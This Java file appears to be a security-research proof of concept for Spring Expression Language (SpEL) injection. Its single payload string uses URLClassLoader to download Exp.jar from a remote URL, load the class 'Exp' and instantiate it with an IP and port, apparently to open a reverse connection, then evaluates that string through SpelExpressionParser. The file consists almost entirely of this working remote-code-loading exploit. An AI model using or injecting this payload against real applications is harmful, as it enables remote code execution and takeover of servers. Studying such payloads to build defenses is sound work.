package PoCAndBypass.ClassLoaderPoC;


import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

// URLClassLoader 结合 SpEL 表达式注入
public class URLClassLoaderBypass {
    public static void main(String[] args) {
        String spel = "new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"http://127.0.0.1:8999/Exp.jar\")}).loadClass(\"Exp\").getConstructors()[0].newInstance(\"127.0.0.1:2333\")";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
